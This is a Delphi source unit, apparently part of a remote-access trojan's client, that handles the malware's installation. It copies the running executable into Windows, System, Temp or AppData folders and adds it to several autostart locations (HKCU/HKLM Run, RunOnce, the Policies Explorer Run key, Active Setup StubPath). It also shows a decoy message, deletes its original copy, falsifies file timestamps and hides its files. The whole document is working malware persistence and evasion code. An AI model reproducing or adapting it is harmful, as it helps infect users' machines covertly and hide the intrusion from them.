unit UnitInstallation;

interface

uses
  Windows, UnitConstants, UnitConfiguration, UnitFunctions;

function InstallClient: string;
procedure EnableStartup(ClientPath: string);
procedure ProcessExtras(ClientPath: string);

implementation

function InstallClient: string;
var
  TmpPath: string;
begin
  Result := ParamStr(0);
  if not _Install then Exit;

  if _Destination = 'Windows' then _Destination := WinDir else
  if _Destination = 'System' then _Destination := SysDir else
  if _Destination = 'Temp' then _Destination := TmpDir else
  if _Destination = 'Root' then _Destination := RootDir else
  if _Destination = 'AppData' then _Destination := AppDataDir else
  if _Destination = 'Program files' then _Destination := ProgramFilesDir else
  begin
    if _Destination[Length(_Destination)] <> '\' then _Destination := _Destination + '\';
    if CreatePath(_Destination) = False then _Destination := TmpDir;
  end;

  if _Destination[Length(_Destination)] <> '\' then _Destination := _Destination + '\';
  TmpPath := _Destination + _FolderName;
  if DirectoryExists(TmpPath) then Exit;
  if CreateDirectory(PChar(TmpPath), nil) = False then Exit;
  TmpPath := TmpPath + '\' + _FileName;

  if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then  Result := TmpPath else
  begin
    Result := ParamStr(0);
    
    TmpPath := TmpDir + _FolderName;
    if DirectoryExists(TmpPath) then Exit;
    if CreateDirectory(PChar(TmpPath), nil) = False then Exit;
    TmpPath := TmpPath + '\' + _FileName;
    
    if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then  Result := TmpPath else
      Result := ParamStr(0);
  end;
end;

procedure EnableStartup(ClientPath: string);
begin
  if (not _Startup) and (not _Install) and (ClientPath = ParamStr(0)) then Exit;

  if _HKCUStartup then
  AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', ClientPath);

  if _HKLMStartup then
  AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\', _StartupKey, 'REG_SZ', ClientPath);

  if _PoliciesStartup then
  AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\', _StartupKey, 'REG_SZ', ClientPath);

  if _ActiveX <> '' then
  CreateKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Active Setup\Installed Components\' + _ActiveX, 'StubPath', ClientPath);

  if _RunOnceStartup then
  begin
    AddRegValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey, 'REG_SZ', ClientPath);
    AddRegValue('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\', _StartupKey, 'REG_SZ', ClientPath);
  end;
end;

procedure ProcessExtras(ClientPath: string);
begin
  if _FakeMessage then
  if (_Install = True) and (ClientPath <> ParamStr(0)) then
  ShowMsg(0, _MessageParams[1], _MessageParams[0], StrToInt(_MessageParams[2]),
    StrToInt(_MessageParams[3]));

  if _Melt then
  if (_Install = True) and (ClientPath <> ParamStr(0)) then MySelfDelete;

  if _ChangeDate then
  if (_Install = True) and (ClientPath <> ParamStr(0)) then
  begin
    ChangeFileTime(ClientPath);
    ChangeDirTime(ExtractFilePath(ClientPath));
  end;

  if _Hide then
  if (_Install = True) and (ClientPath <> ParamStr(0)) then
  begin
    HideFileName(ClientPath);
    HideFileName(ExtractFilePath(ClientPath));
  end;

  if _WaitReboot then
  if (_Install = True) and (ClientPath <> ParamStr(0)) then ExitProcess(0);
end;

end.
